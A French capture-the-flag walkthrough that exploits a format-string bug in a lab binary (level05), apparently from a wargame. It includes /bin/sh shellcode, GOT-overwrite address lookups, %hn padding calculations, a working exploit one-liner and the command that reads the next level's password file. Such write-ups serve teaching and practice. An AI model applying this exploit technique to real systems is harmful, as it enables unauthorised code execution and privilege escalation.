## 🔍 ÉTAPE 1 : ANALYSE DU BINAIRE
* **La Faille** : Le binaire utilise `printf(buffer)` sans spécificateur de format (**Format String**).
* **La Contrainte** : Le programme convertit les majuscules en minuscules via un `XOR 0x20`.
* **Le Plan d'Attaque** : Écraser l'adresse de `exit` dans la **GOT** (Global Offset Table) pour pointer vers notre Shellcode.

## 📍 ÉTAPE 2 : TROUVER L'OFFSET
Nous cherchons la position de notre buffer sur la pile.
1. Lance le programme : `./level05`
2. Entre la sonde : `AAAA %p %p %p %p %p %p %p %p %p %p`
3. **Analyse** : Le motif `0x61616161` apparaît en **10ème position**.

## 🛠 ÉTAPE 3 : PRÉPARATION DU SHELLCODE
On utilise une variable d'environnement pour stocker le code et contourner le filtre des majuscules.

export SHELLCODE=$(python -c "print '\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")


🗺 ÉTAPE 4 : RÉCUPÉRATION DES ADRESSESA. L'Adresse CIBLE (Où écrire ?)

objdump -R ./level05 | grep exit

# Résultat : 080497e0
B. L'Adresse SOURCE (Quoi écrire ?)
On mesure l'adresse de notre variable d'environnement :
echo 'int main(int ac, char **av) { printf("%p\n", getenv(av[1])); }' > /tmp/getenv.c
gcc -m32 /tmp/getenv.c -o /tmp/getenv
/tmp/getenv SHELLCODE
# Exemple de retour : 0xffffd884

💻 ÉTAPE 5 : CALCULS D'EXPLOIT Technique du Short Write (%hn) en deux parties :CibleValeur (Hex)Valeur (Déc)Calcul du Padding0x080497e00xd88455428$55428 - 8 = 55420$0x080497e20xffff65535$65535 - 55428 = 10107$🚀 ÉTAPE 6 : L'EXPLOIT ONE-LINERBash
(python -c "import sys; sys.stdout.write('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55420x%10\$hn' + '%10107x%11\$hn')"; cat) | ./level05


🏁 ÉTAPE 7 : OBTENTION DU FLAG
cat /home/users/level06/.pass